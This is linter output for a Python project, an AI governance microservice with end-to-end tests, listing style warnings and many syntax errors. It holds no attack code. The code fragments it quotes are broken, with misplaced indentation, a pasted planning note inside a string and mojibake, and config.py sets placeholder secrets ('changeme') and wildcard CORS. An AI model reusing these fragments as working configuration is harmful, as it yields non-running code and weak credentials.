F401 [*] `shadow_thirst.static_analysis.ResourceEstimator` imported but unused
  --> docs\shadow_thirst\STATIC_ANALYZERS_DEMO.py:33:5
   |
31 |     PlaneIsolationAnalyzer,
32 |     PrivilegeEscalationAnalyzer,
33 |     ResourceEstimator,
   |     ^^^^^^^^^^^^^^^^^
34 |     StaticAnalyzer,
35 | )
   |
help: Remove unused import

F401 [*] `shadow_thirst.static_analysis.StaticAnalyzer` imported but unused
  --> docs\shadow_thirst\STATIC_ANALYZERS_DEMO.py:34:5
   |
32 |     PrivilegeEscalationAnalyzer,
33 |     ResourceEstimator,
34 |     StaticAnalyzer,
   |     ^^^^^^^^^^^^^^
35 | )
   |
help: Remove unused import

F541 [*] f-string without any placeholders
  --> docs\shadow_thirst\STATIC_ANALYZERS_DEMO.py:47:11
   |
45 | def print_analysis_report(report):
46 |     """Print analysis report findings."""
47 |     print(f"\n≡ƒôè Analysis Summary:")
   |           ^^^^^^^^^^^^^^^^^^^^^^^^^
48 |     print(f"   Total Findings: {report.summary['total_findings']}")
49 |     print(f"   Errors: {report.summary['errors']}")
   |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
  --> docs\shadow_thirst\STATIC_ANALYZERS_DEMO.py:54:15
   |
53 |     if report.findings:
54 |         print(f"\n≡ƒôï Findings:")
   |               ^^^^^^^^^^^^^^^^^
55 |         for finding in report.findings:
56 |             icon = (
   |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
   --> docs\shadow_thirst\STATIC_ANALYZERS_DEMO.py:202:19
    |
201 |         if resource_findings:
202 |             print(f"\n≡ƒôê Resource Estimation Details:")
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
203 |             for finding in resource_findings:
204 |                 if finding.metadata:
    |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
   --> docs\shadow_thirst\STATIC_ANALYZERS_DEMO.py:261:19
    |
260 |         if divergence_findings:
261 |             print(f"\n≡ƒôè Divergence Analysis:")
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
262 |             for finding in divergence_findings:
263 |                 if finding.metadata:
    |
help: Remove extraneous `f` prefix

E402 Module level import not at top of file
  --> e2e\conftest.py:19:1
   |
17 | sys.path.insert(0, str(PROJECT_ROOT))
18 |
19 | from e2e.config.e2e_config import get_config
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
20 | from e2e.fixtures.mocks import (
21 |     mock_email,
   |

E402 Module level import not at top of file
  --> e2e\conftest.py:20:1
   |
19 |   from e2e.config.e2e_config import get_config
20 | / from e2e.fixtures.mocks import (
21 | |     mock_email,
22 | |     mock_geolocation,
23 | |     mock_huggingface,
24 | |     mock_openai,
25 | |     reset_all_mocks,
26 | | )
   | |_^
27 |   from e2e.fixtures.test_data import (
28 |       TEST_AUDIT_LOGS,
   |

E402 Module level import not at top of file
  --> e2e\conftest.py:27:1
   |
25 |       reset_all_mocks,
26 |   )
27 | / from e2e.fixtures.test_data import (
28 | |     TEST_AUDIT_LOGS,
29 | |     TEST_KNOWLEDGE_BASE,
30 | |     TEST_PERSONA_STATES,
31 | | )
   | |_^
32 |   from e2e.fixtures.test_users import get_admin_user, get_regular_user
33 |   from e2e.orchestration.health_checks import HealthChecker
   |

E402 Module level import not at top of file
  --> e2e\conftest.py:32:1
   |
30 |     TEST_PERSONA_STATES,
31 | )
32 | from e2e.fixtures.test_users import get_admin_user, get_regular_user
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
33 | from e2e.orchestration.health_checks import HealthChecker
34 | from e2e.orchestration.service_manager import ServiceManager
   |

E402 Module level import not at top of file
  --> e2e\conftest.py:33:1
   |
31 | )
32 | from e2e.fixtures.test_users import get_admin_user, get_regular_user
33 | from e2e.orchestration.health_checks import HealthChecker
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
34 | from e2e.orchestration.service_manager import ServiceManager
35 | from e2e.orchestration.setup_teardown import E2ETestEnvironment
   |

E402 Module level import not at top of file
  --> e2e\conftest.py:34:1
   |
32 | from e2e.fixtures.test_users import get_admin_user, get_regular_user
33 | from e2e.orchestration.health_checks import HealthChecker
34 | from e2e.orchestration.service_manager import ServiceManager
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
35 | from e2e.orchestration.setup_teardown import E2ETestEnvironment
   |

E402 Module level import not at top of file
  --> e2e\conftest.py:35:1
   |
33 | from e2e.orchestration.health_checks import HealthChecker
34 | from e2e.orchestration.service_manager import ServiceManager
35 | from e2e.orchestration.setup_teardown import E2ETestEnvironment
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
36 |
37 | # Configure logging
   |

B007 Loop control variable `user_id` not used within loop body
   --> e2e\scenarios\test_adversarial_e2e.py:663:13
    |
662 |         # Assert
663 |         for user_id, count in results.items():
    |             ^^^^^^^
664 |             assert count == 5
    |
help: Rename unused `user_id` to `_user_id`

SIM117 Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> e2e\scenarios\test_memory_knowledge_e2e.py:673:9
    |
671 |           # Act - Compress the memory
672 |           compressed_file = archive_dir / "compress_test.json.gz"
673 | /         with open(memory_file, "rb") as f_in:
674 | |             with gzip.open(compressed_file, "wb") as f_out:
    | |___________________________________________________________^
675 |                   f_out.writelines(f_in)
    |
help: Combine `with` statements

F402 Import `queue` from line 15 shadowed by loop variable
   --> e2e\scenarios\test_multi_agent_e2e.py:372:27
    |
370 |         # Act - Implement work stealing
371 |         while any(len(wq) > 1 for wq in work_queues.values()):
372 |             for agent_id, queue in work_queues.items():
    |                           ^^^^^
373 |                 if len(queue) > 1:
374 |                     # Find idle agent
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> e2e\utils\assertions.py:186:5
    |
184 |           raise AssertionError(f"Action '{action}' endangers humanity but was allowed")
185 |
186 | /     if context.get("harms_user") and not context.get("is_user_order"):
187 | |         if is_allowed:
    | |______________________^
188 |               raise AssertionError(
189 |                   f"Action '{action}' harms user without explicit order but was allowed"
    |
help: Combine `if` statements using `and`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> e2e\utils\test_helpers.py:207:12
    |
206 |     def compare_recursive(o1, o2, path=""):
207 |         if type(o1) != type(o2):
    |            ^^^^^^^^^^^^^^^^^^^^
208 |             differences.append(f"{path}: Type mismatch ({type(o1)} vs {type(o2)})")
209 |             return
    |

F401 [*] `fastapi.Response` imported but unused
  --> emergent-microservices\_common\middleware.py:11:30
   |
 9 | import uuid
10 |
11 | from fastapi import Request, Response
   |                              ^^^^^^^^
12 | from prometheus_client import Counter, Histogram
13 | from starlette.middleware.base import BaseHTTPMiddleware
   |
help: Remove unused import: `fastapi.Response`

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\config.py:12:1
   |
10 | class Settings(BaseSettings):
11 |     """Application settings with validation"""
12 |     
   | ^^^^
13 |     # Service Metadata
14 |     SERVICE_NAME: str = "AI Mutation Governance Firewall"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\config.py:17:1
   |
15 |     VERSION: str = "1.0.0"
16 |     ENVIRONMENT: str = Field(default="development", pattern="^(development|staging|production)$")
17 |     
   | ^^^^
18 |     # Server Configuration
19 |     HOST: str = "0.0.0.0"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\config.py:22:1
   |
20 |     PORT: int = 8000
21 |     API_PREFIX: str = "/api/v1"
22 |     
   | ^^^^
23 |     # Security
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\ai-mutation-governance-firewall\app\config.py:25:1
   |
23 |     # Security
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
25 |     API_KEY_HEADER: str = "X-API-Key"
   | ^^^^
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
27 |     JWT_ALGORITHM: str = "HS256"
   |

invalid-syntax: Expected a statement
  --> emergent-microservices\ai-mutation-governance-firewall\app\config.py:26:1
   |
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
25 |     API_KEY_HEADER: str = "X-API-Key"
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
   | ^
27 |     JWT_ALGORITHM: str = "HS256"
28 |     JWT_EXPIRY_HOURS: int = 24
   |

invalid-syntax: Unexpected indentation
  --> emergent-microservices\ai-mutation-governance-firewall\app\config.py:27:1
   |
25 |     API_KEY_HEADER: str = "X-API-Key"
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
27 |     JWT_ALGORITHM: str = "HS256"
   | ^^^^
28 |     JWT_EXPIRY_HOURS: int = 24
29 | # Rate Limiting
   |

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\config.py:32:1
   |
30 |     RATE_LIMIT_PER_MINUTE: int = 250
31 |     RATE_LIMIT_BURST: int = 500
32 |     
   | ^^^^
33 |     # CORS
34 |     CORS_ORIGINS: List[str] = ['*']
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\config.py:35:1
   |
33 |     # CORS
34 |     CORS_ORIGINS: List[str] = ['*']
35 |     
   | ^^^^
36 |     # Database
37 | DB_POOL_SIZE: int = 20
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\ai-mutation-governance-firewall\app\config.py:37:1
   |
36 |     # Database
37 | DB_POOL_SIZE: int = 20
   | ^
38 |     DB_TIMEOUT: int = 30
   |

invalid-syntax: Unexpected indentation
  --> emergent-microservices\ai-mutation-governance-firewall\app\config.py:38:1
   |
36 |     # Database
37 | DB_POOL_SIZE: int = 20
38 |     DB_TIMEOUT: int = 30
   | ^^^^
39 |     
40 |     # Observability
   |

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\config.py:39:1
   |
37 | DB_POOL_SIZE: int = 20
38 |     DB_TIMEOUT: int = 30
39 |     
   | ^^^^
40 |     # Observability
41 |     LOG_LEVEL: str = "INFO"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\config.py:45:1
   |
43 |     ENABLE_TRACING: bool = true
44 |     METRICS_PORT: int = 9090
45 |     
   | ^^^^
46 |     # Feature Flags
47 |     ENABLE_API_DOCS: bool = true
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\config.py:48:1
   |
46 |     # Feature Flags
47 |     ENABLE_API_DOCS: bool = true
48 |     
   | ^^^^
49 |     model_config = SettingsConfigDict(
50 |         env_file=".env",
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\config.py:55:1
   |
53 |         extra="ignore",
54 |     )
55 |     
   | ^^^^
56 |     def is_production(self) -> bool:
57 |         """Check if running in production"""
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\config.py:59:1
   |
57 |         """Check if running in production"""
58 |         return self.ENVIRONMENT == "production"
59 |     
   | ^^^^
60 |     def is_development(self) -> bool:
61 |         """Check if running in development"""
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\ai-mutation-governance-firewall\app\config.py:66:1
   |
65 | # Global settings instance
66 | settings = Settings()
   | ^
67 |
68 | # Validate critical settings on import
   |

invalid-syntax: Expected an indented block after `if` statement
  --> emergent-microservices\ai-mutation-governance-firewall\app\config.py:70:1
   |
68 | # Validate critical settings on import
69 | if settings.is_production():
70 | if "changeme" in settings.API_KEYS:
   | ^^
71 |         raise ValueError("API_KEYS must be changed in production")
72 | if settings.JWT_SECRET == "changeme-secret-key":
   |

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\ai-mutation-governance-firewall\app\errors.py:5:1
  |
3 | """
4 |
5 | from typing import Any, Dict, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6 |
7 | from fastapi import FastAPI, Request, status
  |

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\ai-mutation-governance-firewall\app\errors.py:21:18
   |
19 |         code: str,
20 |         status_code: int = status.HTTP_500_INTERNAL_SERVER_ERROR,
21 |         details: Optional[Dict[str, Any]] = None,
   |                  ^^^^^^^^^^^^^^^^^^^^^^^^
22 |     ):
23 |         self.message = message
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\ai-mutation-governance-firewall\app\errors.py:21:27
   |
19 |         code: str,
20 |         status_code: int = status.HTTP_500_INTERNAL_SERVER_ERROR,
21 |         details: Optional[Dict[str, Any]] = None,
   |                           ^^^^
22 |     ):
23 |         self.message = message
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\ai-mutation-governance-firewall\app\errors.py:33:47
   |
31 |     """Validation error"""
32 |
33 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^
34 |         super().__init__(
35 |             message=message,
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\ai-mutation-governance-firewall\app\errors.py:33:56
   |
31 |     """Validation error"""
32 |
33 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                                        ^^^^
34 |         super().__init__(
35 |             message=message,
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\ai-mutation-governance-firewall\app\errors.py:79:47
   |
77 |     """Conflict error (e.g., duplicate resource)"""
78 |
79 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^
80 |         super().__init__(
81 |             message=message,
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\ai-mutation-governance-firewall\app\errors.py:79:56
   |
77 |     """Conflict error (e.g., duplicate resource)"""
78 |
79 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                                        ^^^^
80 |         super().__init__(
81 |             message=message,
   |
help: Replace with `dict`

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\health.py:41:1
   |
39 |     checks = {}
40 |     all_ready = True
41 |     
   | ^^^^
42 |     # Check database connection
43 |     try:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\health.py:52:1
   |
50 |         checks["database"] = "error"
51 |         all_ready = False
52 |     
   | ^^^^
53 |     response_status = "ready" if all_ready else "not_ready"
54 |     status_code = status.HTTP_200_OK if all_ready else status.HTTP_503_SERVICE_UNAVAILABLE
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\health.py:55:1
   |
53 |     response_status = "ready" if all_ready else "not_ready"
54 |     status_code = status.HTTP_200_OK if all_ready else status.HTTP_503_SERVICE_UNAVAILABLE
55 |     
   | ^^^^
56 |     return HealthResponse(
57 |         status=response_status,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\health.py:82:1
   |
80 |     checks = {}
81 |     startup_complete = True
82 |     
   | ^^^^
83 |     # Check database connection
84 |     try:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\health.py:93:1
   |
91 |         checks["database"] = "error"
92 |         startup_complete = False
93 |     
   | ^^^^
94 | # Check migrations
95 |     try:
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
   --> emergent-microservices\ai-mutation-governance-firewall\app\health.py:106:1
    |
104 |         startup_complete = False
105 | response_status = "started" if startup_complete else "starting"
106 |     status_code = status.HTTP_200_OK if startup_complete else status.HTTP_503_SERVICE_UNAVAILABLE
    | ^^^^
107 |     
108 |     return HealthResponse(
    |

W293 Blank line contains whitespace
   --> emergent-microservices\ai-mutation-governance-firewall\app\health.py:107:1
    |
105 | response_status = "started" if startup_complete else "starting"
106 |     status_code = status.HTTP_200_OK if startup_complete else status.HTTP_503_SERVICE_UNAVAILABLE
107 |     
    | ^^^^
108 |     return HealthResponse(
109 |         status=response_status,
    |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
   --> emergent-microservices\ai-mutation-governance-firewall\app\health.py:115:1
    |
113 |         checks=checks,
114 |     )
    |      ^
    |

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\logging_config.py:17:1
   |
15 | class JSONFormatter(logging.Formatter):
16 |     """JSON log formatter for structured logging"""
17 |     
   | ^^^^
18 |     def format(self, record: logging.LogRecord) -> str:
19 |         log_data: Dict[str, Any] = {
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\logging_config.py:27:1
   |
25 |             "version": "1.0.0",
26 |         }
27 |         
   | ^^^^^^^^
28 |         # Add request ID if available
29 |         request_id = request_id_var.get()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\logging_config.py:32:1
   |
30 |         if request_id:
31 |             log_data["request_id"] = request_id
32 |         
   | ^^^^^^^^
33 |         # Add exception info if present
34 |         if record.exc_info:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\logging_config.py:36:1
   |
34 |         if record.exc_info:
35 |             log_data["exception"] = self.formatException(record.exc_info)
36 |         
   | ^^^^^^^^
37 |         # Add extra fields
38 |         if hasattr(record, "extra"):
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\logging_config.py:40:1
   |
38 |         if hasattr(record, "extra"):
39 |             log_data.update(record.extra)
40 |         
   | ^^^^^^^^
41 |         return json.dumps(log_data)
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\ai-mutation-governance-firewall\app\logging_config.py:49:1
   |
47 | handler.setFormatter(JSONFormatter())
48 | # Configure root logger
49 |     logging.root.handlers = [handler]
   | ^^^^
50 |     logging.root.setLevel("INFO")
   |

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\logging_config.py:51:1
   |
49 |     logging.root.handlers = [handler]
50 |     logging.root.setLevel("INFO")
51 |     
   | ^^^^
52 |     # Reduce noise from third-party libraries
53 |     logging.getLogger("uvicorn").setLevel(logging.WARNING)
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\ai-mutation-governance-firewall\app\logging_config.py:58:1
   |
57 | # Create module logger
58 | logger = logging.getLogger("ai_mutation_governance_firewall")
   | ^
   |

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:60:1
   |
58 |     # Startup
59 |     logger.info("Starting AI Mutation Governance Firewall service v1.0.0")
60 |     
   | ^^^^
61 |     # Initialize database
62 |     await database.connect()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:64:1
   |
62 |     await database.connect()
63 |     logger.info("Database connection established")
64 |     
   | ^^^^
65 |     # Run migrations if needed
66 | from .repository import run_migrations
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:67:1
   |
65 |     # Run migrations if needed
66 | from .repository import run_migrations
67 |     await run_migrations()
   | ^^^^
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
   |

invalid-syntax: Expected a statement
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:69:1
   |
67 |     await run_migrations()
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
   | ^
70 |     
71 |     yield
   |

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:70:1
   |
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
70 |     
   | ^^^^
71 |     yield
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:71:1
   |
69 | logger.info("Service startup complete")
70 |     
71 |     yield
   | ^^^^
72 |     
73 |     # Shutdown
   |

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:72:1
   |
71 |     yield
72 |     
   | ^^^^
73 |     # Shutdown
74 |     logger.info("Shutting down AI Mutation Governance Firewall service")
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:75:1
   |
73 |     # Shutdown
74 |     logger.info("Shutting down AI Mutation Governance Firewall service")
75 |     
   | ^^^^
76 |     # Close database connections
77 |     await database.disconnect()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:79:1
   |
77 |     await database.disconnect()
78 |     logger.info("Database connections closed")
79 |     
   | ^^^^
80 |     logger.info("Service shutdown complete")
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:84:1
   |
83 | # Create FastAPI application
84 | app = FastAPI(
   | ^
85 |     title="AI Mutation Governance Firewall",
86 |     description="build a runtime AI mutation gate.
   |

invalid-syntax: missing closing quote in string literal
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:86:17
   |
84 | app = FastAPI(
85 |     title="AI Mutation Governance Firewall",
86 |     description="build a runtime AI mutation gate.
   |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
87 | Microservices:
88 | Model change proposal intake
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:87:1
   |
85 |     title="AI Mutation Governance Firewall",
86 |     description="build a runtime AI mutation gate.
87 | Microservices:
   | ^^^^^^^^^^^^^
88 | Model change proposal intake
89 | Deterministic shadow simulation
   |

invalid-syntax: Expected `,`, found `:`
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:87:14
   |
85 |     title="AI Mutation Governance Firewall",
86 |     description="build a runtime AI mutation gate.
87 | Microservices:
   |              ^
88 | Model change proposal intake
89 | Deterministic shadow simulation
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:88:1
   |
86 |     description="build a runtime AI mutation gate.
87 | Microservices:
88 | Model change proposal intake
   | ^^^^^
89 | Deterministic shadow simulation
90 | Quorum validation engine
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:88:7
   |
86 |     description="build a runtime AI mutation gate.
87 | Microservices:
88 | Model change proposal intake
   |       ^^^^^^
89 | Deterministic shadow simulation
90 | Quorum validation engine
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:88:14
   |
86 |     description="build a runtime AI mutation gate.
87 | Microservices:
88 | Model change proposal intake
   |              ^^^^^^^^
89 | Deterministic shadow simulation
90 | Quorum validation engine
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:88:23
   |
86 |     description="build a runtime AI mutation gate.
87 | Microservices:
88 | Model change proposal intake
   |                       ^^^^^^
89 | Deterministic shadow simulation
90 | Quorum validation engine
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:89:1
   |
87 | Microservices:
88 | Model change proposal intake
89 | Deterministic shadow simulation
   | ^^^^^^^^^^^^^
90 | Quorum validation engine
91 | Rollback + snapshot manager
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:89:15
   |
87 | Microservices:
88 | Model change proposal intake
89 | Deterministic shadow simulation
   |               ^^^^^^
90 | Quorum validation engine
91 | Rollback + snapshot manager
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:89:22
   |
87 | Microservices:
88 | Model change proposal intake
89 | Deterministic shadow simulation
   |                      ^^^^^^^^^^
90 | Quorum validation engine
91 | Rollback + snapshot manager
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:90:1
   |
88 | Model change proposal intake
89 | Deterministic shadow simulation
90 | Quorum validation engine
   | ^^^^^^
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:90:8
   |
88 | Model change proposal intake
89 | Deterministic shadow simulation
90 | Quorum validation engine
   |        ^^^^^^^^^^
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:90:19
   |
88 | Model change proposal intake
89 | Deterministic shadow simulation
90 | Quorum validation engine
   |                   ^^^^^^
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:91:1
   |
89 | Deterministic shadow simulation
90 | Quorum validation engine
91 | Rollback + snapshot manager
   | ^^^^^^^^
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:91:21
   |
89 | Deterministic shadow simulation
90 | Quorum validation engine
91 | Rollback + snapshot manager
   |                     ^^^^^^^
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:92:1
   |
90 | Quorum validation engine
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
   | ^^^^^^^^^^^^^
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:92:15
   |
90 | Quorum validation engine
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
   |               ^^^^^^
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:92:22
   |
90 | Quorum validation engine
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
   |                      ^^^^^^^^^^^^
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:93:1
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   | ^^^^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:93:6
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |      ^^^^^^^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Expected `,`, found `:`
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:93:13
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |             ^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Got unexpected token ΓÇ£
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:93:15
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |               ^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:93:16
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                ^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:93:18
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                  ^^^^^^^^^^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:93:29
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                             ^^^^^^^^^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
